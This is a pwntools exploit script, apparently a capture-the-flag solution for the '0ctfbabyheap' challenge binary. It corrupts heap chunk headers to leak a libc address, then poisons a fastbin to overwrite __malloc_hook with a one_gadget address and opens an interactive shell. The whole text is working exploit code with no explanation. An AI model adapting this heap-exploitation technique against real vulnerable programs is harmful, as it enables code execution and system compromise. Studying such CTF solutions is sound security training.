from pwn import *

r = process('0ctfbabyheap')

m0 = lambda: r.recvuntil('Command:')
m1 = lambda: r.recvuntil('Size:')
m2 = lambda: r.recvuntil('Index:')
m3 = lambda: r.recvuntil('Content:')
s = lambda x: r.send(str(x))
sl = lambda x: r.sendline(str(x))

def delete(idx):
    m0()
    sl(3)
    m2()
    sl(idx)

def alloc(size):
    m0()
    sl(1)
    m1()
    sl(size)

def mFill(idx, size, data):
    m0()
    sl(2)
    m2()
    sl(idx)
    m1()
    sl(size)
    m3()
    s(data)

def dump(idx):
    m0()
    sl(4)
    m2()
    sl(idx)
    return r.recvuntil('1. Allocate').split('\n')[1]

# init
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x80)

# free fastbin
delete(1)
delete(2)


# Leak Libc
payload = ''
payload += p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
payload += '\xc0'
mFill(0,len(payload),payload)
payload = ''
payload += p64(0)*5
payload += p64(0x31)
mFill(3,len(payload),payload)
alloc(0x20)
alloc(0x20)

payload = ''
payload += p64(0)*5
payload += p64(0x91)
mFill(3,len(payload),payload)
alloc(0x80)
delete(4)

libc = u64(dump(2)[:8]) - 3951480
log.success("libc : %s"%(hex(libc)))
__malloc_hook = libc + 3951376-0x28+0x5
oneshot = libc + 0x000000000004526A

# Overwrite __malloc_hook
alloc(0x60) # 4
alloc(0x60) # 6
alloc(0x60) # 7
alloc(0x60) # 8
delete(7)
delete(8)
payload = ''
payload += p64(0)*13
payload += p64(0x71)
payload += p64(0)*13
payload += p64(0x71)
payload += p64(__malloc_hook)
mFill(6,len(payload),payload)

alloc(0x60) # 7
alloc(0x60) # 8

payload = ''
payload += '\x00'*19
payload += p64(oneshot)
mFill(8,len(payload),payload)

alloc(0x50) # Trigger

r.interactive()
